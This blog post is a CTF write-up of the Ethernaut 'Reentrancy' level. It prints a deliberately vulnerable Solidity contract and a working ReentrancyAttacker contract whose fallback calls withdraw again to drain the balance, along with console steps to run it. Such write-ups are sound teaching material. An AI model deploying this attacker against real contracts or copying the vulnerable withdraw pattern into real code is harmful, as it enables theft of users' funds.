---
layout: post
title: Ethernaut - 10. Reentrancy
date:  2022-09-24
tags: ethernaut solidity
---
## Difficulty: 🌕🌕🌕🌑🌑
> The goal of this level is for you to steal all the funds from the contract.<br /><br />
  Things that might help:
  - Untrusted contracts can execute code where you least expect it.
  - Fallback methods
  - Throw/revert bubbling
  - Sometimes the best way to attack a contract is with another contract.
  - See the Help page above, section "Beyond the console"

## Contract
``` solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
```

## Writeup
1. Get new instance.
2. Get contract's balance.
    ``` javascript

    await getBalance(contract.address)
    // 0.001

    ```
3. Create a contract.
    ``` solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;

    interface IReentrance {
        function donate(address _to) external payable;
        function withdraw(uint256 _amount) external;
    }

    contract ReentrancyAttacker {
        IReentrance levelInstance;
        uint targetValue = 0.001 ether;

        constructor(address _levelInstance) {
            levelInstance = IReentrance(_levelInstance);
        }

        function attack() public {
            levelInstance.withdraw(targetValue);
        }

        fallback() external payable {
            levelInstance.withdraw(targetValue);
        }
    }
    ```
4. Compile and deploy with `Reentrance` instance address.
5. Donate 0.001 ether to our `ReentrancyAttacker` contract.
    ```javascript

    await contract.donate('REENTRANCYATTACKER_CONTRACT_ADDRESS', {value: 0.001 })

    ```
6. Call `attack` function in the `ReentrancyAttacker`.
7. Submit instance ξ( ✿＞◡❛)